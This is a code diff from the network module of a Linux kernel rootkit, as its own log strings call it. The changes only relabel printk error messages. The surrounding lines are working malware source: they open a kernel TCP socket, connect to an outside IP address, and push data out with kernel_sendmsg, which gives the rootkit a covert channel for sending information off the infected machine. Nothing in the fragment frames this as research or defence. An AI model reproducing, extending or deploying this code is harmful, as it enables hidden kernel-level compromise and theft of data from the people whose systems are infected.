@@ -13,7 +13,7 @@ int rk_net_init(void) {
   rk_sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_KERNEL);
   ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &rk_sock);
   if (ret < 0) {
-    printk("sock_create_kern failed\n");
+    printk("rootkit: sock_create_kern failed\n");
     return ret;
   }
   memset(&s_addr, 0, sizeof(s_addr));
@@ -22,7 +22,7 @@ int rk_net_init(void) {
   s_addr.sin_addr.s_addr = in_aton(IP);
   ret = rk_sock->ops->connect(rk_sock, (struct sockaddr*)&s_addr, sizeof(s_addr), 0);
   if (ret != 0) {
-    printk("rk_sock->ops->connect failed\n");
+    printk("rootkit: rk_sock->ops->connect failed\n");
     return ret;
   }
   return 0;
@@ -43,7 +43,7 @@ int rk_net_send(char* s) {
     rk_net_init();
     ret = kernel_sendmsg(rk_sock, &msghdr, &kvec, 1, buf_sz);
     if (ret < 0) {
-      printk("kernel_sendmsg failed\n");
+      printk("rootkit: kernel_sendmsg failed\n");
       return ret;
     }
   }
